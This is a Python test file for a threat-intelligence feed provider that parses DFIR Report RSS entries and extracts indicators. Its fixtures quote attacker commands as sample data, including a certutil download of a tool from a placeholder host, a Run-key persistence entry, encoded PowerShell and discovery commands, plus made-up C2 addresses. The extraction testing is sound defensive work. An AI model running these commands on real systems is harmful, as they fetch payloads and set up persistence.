"""Tests for The DFIR Report structured CTI provider."""

from __future__ import annotations

from pathlib import Path

import httpx

from hecate_runner.cti.base import ATTACK_TECHNIQUE_LINE
from hecate_runner.cti.dfir_report import (
    DfirReportCursorState,
    DfirReportProvider,
    extract_procedural_artifacts,
)

SAMPLE_DFIR_XML = """<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0"
     xmlns:content="http://purl.org/rss/1.0/modules/content/"
     xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>The DFIR Report</title>
    <link>https://thedfirreport.com</link>
    <description>Real Intrusion Analyses</description>
    <item>
      <title>Cat's Got Your Files: Lynx Ransomware In 3 Hours</title>
      <link>https://thedfirreport.com/2026/08/10/lynx-ransomware/</link>
      <guid isPermaLink="false">dfir-report-101</guid>
      <pubDate>Mon, 10 Aug 2026 12:00:00 +0000</pubDate>
      <dc:creator>The DFIR Report</dc:creator>
      <category>Ransomware</category>
      <category>Lynx</category>
      <description><![CDATA[Threat actors deployed Lynx ransomware via compromised credentials and living off the land binaries.]]></description>
      <content:encoded><![CDATA[
        <p>The intrusion began when attackers accessed the internal network using stolen credentials.</p>
        <p>They executed: <code>powershell.exe -enc SQBYAE0A...</code> to drop their staging payload.</p>
        <p>Adversaries performed discovery with <code>nltest.exe /dclist:</code> and <code>whoami /all</code>.</p>
        <p>Lateral movement was observed using: <code>cmd.exe /c net use \\\\10.0.0.5\\c$</code>.</p>
        <p>The attackers staged tools in C:\\Windows\\Temp\\update.exe and registered HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater.</p>
        <p>Network beaconing connected to 198.51.100.25:8443 and c2.malicious-domain.xyz.</p>
        <p>Techniques observed include T1078, T1059.001, and T1003.001.</p>
      ]]></content:encoded>
    </item>
  </channel>
</rss>
"""


def test_cursor_state_lifecycle(tmp_path: Path) -> None:
    cursor_file = tmp_path / "dfir_cursor.json"
    cursor = DfirReportCursorState.load(cursor_file)
    assert cursor.seen_ids == []
    assert not cursor.already_seen(["entry-1", "entry-2"])

    cursor.advance(["entry-1"])
    cursor.save(cursor_file)

    loaded = DfirReportCursorState.load(cursor_file)
    assert loaded.already_seen(["entry-1"])
    assert not loaded.already_seen(["entry-2"])


def test_extract_procedural_artifacts() -> None:
    sample_text = """
    The attackers ran:
    powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\stage.ps1
    cmd.exe /c whoami /all
    nltest /dclist:example.com
    adfind.exe -f "(objectcategory=person)"
    certutil.exe -urlcache -split -f http://198.51.100.50/tool.bin C:\\Windows\\Temp\\tool.exe
    reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Stage /t REG_SZ /d C:\\Windows\\Temp\\tool.exe /f

    C2 server was 203.0.113.10:443 and beacon.adversary-infra.xyz
    Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
    """

    artifacts = extract_procedural_artifacts(sample_text)
    assert len(artifacts["commands"]) >= 4
    assert any("powershell" in c.lower() for c in artifacts["commands"])
    assert any("adfind" in c.lower() for c in artifacts["commands"])
    assert any("certutil" in c.lower() for c in artifacts["commands"])
    assert "C:\\Windows\\Temp\\tool.exe" in artifacts["file_paths"] or any(
        "tool.exe" in p for p in artifacts["file_paths"]
    )
    assert any("CurrentVersion\\Run" in k for k in artifacts["registry_keys"])
    assert "203.0.113.10" in artifacts["ipv4"] or "203.0.113.10:443" in artifacts["ipv4"]
    assert "beacon.adversary-infra.xyz" in artifacts["domains"]
    assert "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" in artifacts["sha256"]


def test_dfir_report_provider_poll_and_acknowledge(tmp_path: Path) -> None:
    cursor_file = tmp_path / "dfir_cursor.json"

    def handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(200, text=SAMPLE_DFIR_XML)

    client = httpx.Client(transport=httpx.MockTransport(handler))
    provider = DfirReportProvider(
        cursor_file=cursor_file,
        feed_url="https://thedfirreport.com/feed/",
        max_entry_age_days=365,
        client=client,
    )

    item = provider.next_item()
    assert item is not None
    assert item.source == "dfir_report"
    assert "Lynx Ransomware" in item.title
    assert item.source_url == "https://thedfirreport.com/2026/08/10/lynx-ransomware/"
    assert ATTACK_TECHNIQUE_LINE in item.content
    assert "T1059.001" in item.content
    assert "Intrusion Execution Procedures & Commands:" in item.content
    assert item.metadata["evidence_profile"] == "intrusion_walkthrough"
    assert "T1059.001" in item.metadata["techniques"]
    assert len(item.metadata["procedural_commands"]) > 0

    # Acknowledge
    provider.acknowledge(item)

    # Next call returns None since entry is now in cursor
    assert provider.next_item() is None


def test_dfir_report_provider_http_error(tmp_path: Path) -> None:
    cursor_file = tmp_path / "dfir_cursor.json"

    def error_handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(500, text="Internal Server Error")

    client = httpx.Client(transport=httpx.MockTransport(error_handler))
    provider = DfirReportProvider(cursor_file=cursor_file, client=client)

    item = provider.next_item()
    assert item is None
